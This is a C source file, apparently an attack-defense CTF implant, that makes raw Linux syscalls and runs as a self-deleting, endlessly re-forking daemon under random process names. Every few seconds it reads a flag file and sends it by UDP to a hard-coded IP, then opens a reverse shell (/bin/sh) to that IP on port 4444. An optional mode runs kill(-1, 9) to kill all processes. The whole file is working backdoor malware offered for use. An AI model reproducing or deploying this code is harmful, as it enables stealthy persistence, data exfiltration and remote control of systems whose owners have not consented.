#define INTERVAL 100 //轮询时间间隔，可以根据情况改小
/*compile: 切记不能使用优化选项
For x64: gcc crazy_asm.c -o crazy_asm -DX64 -nostdlib
For x86: gcc -m32 crazy_asm.c -o crazy_asm -DX86 -nostdlib
*/  
struct sockaddr_in
{
    unsigned short sin_family;
    unsigned short sin_port;
    unsigned int sin_addr;
    unsigned char sin_zero[8];
};

#ifdef X64
int fork()
{
    __asm__("xor %rax,%rax\n"
            "mov $0x39,%al\n"
            "syscall");
}

void daemonlize()
{
    //umask(0)
    __asm__("xor %rax,%rax\n"
            "xor %rdi,%rdi\n"
            "mov $0x5f,%al\n"
            "syscall");
    
    if(fork() > 0)
    {
        //exit(0)
        __asm__("xor %rax,%rax\n"
                "mov $0x3c,%al\n"
                "syscall");
    }
    //setsid();
    __asm__("xor %rax,%rax\n"
            "mov $0x70,%al\n"
            "syscall");
}

int kill(int pid, int signal)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x3E, %al\n"
            "syscall");
}

int open(const char *path, int oflag)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x2,%al\n"
            "syscall");
}

int read(int fd, void *buf, unsigned int nbyte)
{
    __asm__("xor %rax,%rax\n"
            "syscall");
}

int close(int fd)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x3,%al\n"
            "syscall");
}

int socket(int family, int type, int proto)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x29,%al\n"
            "syscall");
}

int sendto(int fd, void *buff, int len, int flags, struct sockaddr_in * addr, int addrsize)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x2c,%al\n"
            "syscall");
}

void usleep(struct timeval *delay)
{
    //select(0,0,0,0,delay)
    __asm__("xor %rax,%rax\n"
            "mov $0x17, %al\n"
            "mov %rdi,%r8\n"
            "xor %rdi,%rdi\n"
            "xor %rsi,%rsi\n"
            "xor %r10,%r10\n"
            "xor %r9,%r9\n"
            "syscall"
            );
}

void prctl(int cmd, char * name)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x9d,%al\n"
            "syscall");
}

void write(int fd, void * buf, unsigned int nbyte)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x1,%al\n"
            "syscall");
}

void execve(const char * path, char * const argv[], char *const *envp)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x3b,%al\n"
            "syscall");
}

void dup2(int filedes, int filedes2)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x21,%al\n"
            "syscall");
}

int connect(int fd, struct sockaddr_in *uservaddr, int addrlen)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x2a,%al\n"
            "syscall");
}

void exit(int status)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x3c,%al\n"
            "syscall");
}

int unlink(const char *path)
{
    __asm__("xor %rax,%rax\n"
            "mov $0x57,%al\n"
            "syscall");
}
#endif

#ifdef X86
#define SYS_SOCKET  1
#define SYS_CONNECT 3
#define SYS_SENDTO  11
int fork()
{
    __asm__("xor %eax,%eax\n"
            "mov $0x2,%al\n"
            "int $0x80");
}

void daemonlize()
{
    //umask(0)
    __asm__("xor %eax,%eax\n"
            "xor %ebx,%ebx\n"
            "mov $0x3c,%al\n"
            "int $0x80");
    
    if(fork() > 0)
    {
        //exit(0)
        __asm__("xor %eax,%eax\n"
                "mov $0x1,%eax\n"
                "int $0x80");
    }
    //setsid();
    __asm__("xor %eax,%eax\n"
            "mov $0x42,%eax\n"
            "int $0x80");
}

int open(const char *path, int oflag)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x5,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

int read(int fd, void *buf, unsigned int nbyte)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x3,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "mov 0x10(%ebp), %edx\n"
            "int $0x80");
}

int kill(int pid, int signal)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x25, %al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

int close(int fd)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x6,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "int $0x80");
}

int socketall(int call, unsigned long * args)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x66,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

int socket(int family, int type, int proto)
{
    unsigned long args[3] = {family, type, proto};
    return socketall(SYS_SOCKET, args);
}

int sendto(int fd, void *buff, int len, int flags, struct sockaddr_in * addr, int addrsize)
{
    unsigned long args[6] = {fd, (unsigned long)buff, len, flags, (unsigned long)addr, addrsize};
    return socketall(SYS_SENDTO, args);
}

void usleep(struct timeval *delay)
{
    //select(0,0,0,0,delay)
    __asm__("xor %eax,%eax\n"
            "mov $0x8e, %al\n"
            "mov 0x8(%ebp), %edi\n"
            "xor %ebx,%ebx\n"
            "xor %ecx,%ecx\n"
            "xor %edx,%edx\n"
            "xor %esi,%esi\n"
            "int $0x80"
            );
}

void prctl(int cmd, char * name)
{
    __asm__("xor %eax,%eax\n"
            "mov $0xac,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

void write(int fd, void * buf, unsigned int nbyte)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x4,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "mov 0x10(%ebp), %edx\n"
            "int $0x80");
}

void execve(const char * path, char * const argv[], char *const *envp)
{
    __asm__("xor %eax,%eax\n"
            "mov $0xb,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "mov 0x10(%ebp), %edx\n"
            "int $0x80");
}

void dup2(int filedes, int filedes2)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x3f,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "mov 0xc(%ebp), %ecx\n"
            "int $0x80");
}

int connect(int fd, struct sockaddr_in *uservaddr, int addrlen)
{
    unsigned long args[3] = {fd, uservaddr, addrlen};
    return socketall(SYS_CONNECT, args);
}

int exit(int status)
{
    __asm__("xor %eax,%eax\n"
            "mov $0x1,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "int $0x80");
}

int unlink(const char *path)
{
    __asm__("xor %eax,%eax\n"
            "mov $0xa,%al\n"
            "mov 0x8(%ebp), %ebx\n"
            "int $0x80");
}
#endif

void get_name(char * argv0)
{
    unsigned char namelen = 0;
    int fd = open("/dev/urandom", 0);
    read(fd, &namelen, 1);
    namelen &= 0xF;
    read(fd, argv0, namelen);
    argv0[namelen] = 0;
    close(fd);
}

void post_flag()
{
    int sock = socket(2,2,0);//udp
    struct sockaddr_in addr = {0,0,0,{0,0,0,0,0,0,0,0}};
    addr.sin_family = 2;
    addr.sin_port = 0xB722;//8887
    addr.sin_addr = 0x73E56464;//100.100.229.115

    int fd = open("/home/xman/flag", 0);
    char msg[255] = {0};
    int len = read(fd, msg, sizeof(msg));
    close(fd);
    sendto(sock, msg, len, 0, &addr, sizeof(addr));
    close(sock);
}

void reverse_shell()
{
    if(fork() > 0)
    {
        return;
    }
    //child
    int sockfd = socket(2,1,0);//tcp
    struct sockaddr_in addr = {0,0,0,{0,0,0,0,0,0,0,0}};
    addr.sin_family = 2;
    addr.sin_port = 0x5c11;//4444
    addr.sin_addr = 0x73E56464;//100.100.229.115

    if(connect(sockfd, &addr, sizeof(addr)) != 0)
        exit(0);
    
    dup2(sockfd,0);
    dup2(sockfd,1);
    dup2(sockfd,2);

    execve("/bin/sh",0,0);
}

void self_delete()
{
    int fd = open("/proc/self/cmdline", 0);
    char path[255] = {0};
    read(fd, path, sizeof(path));
    close(fd);
    unlink(path);
}

int g_timer = 0;

//#define CLEAN_BKDOOR
void _start()
{
    self_delete();
new_child:
    daemonlize();
    char name[16] = {0};
    get_name(name);
    prctl(15, name); 
    //do job
    ++g_timer;
    if(g_timer == 10000)//10000次,3-4秒周期
    {
        g_timer = 0;
        post_flag();
    #if !defined(CLEAN_BKDOOR)
        reverse_shell();
    #endif
    }
#if defined(CLEAN_BKDOOR)
    kill(-1, 9);
#endif    
    
    struct timeval
    {
        long tv_sec;
        long tv_usec;
    }tvp = {0, INTERVAL};

    usleep(&tvp);
    goto new_child;
}
 
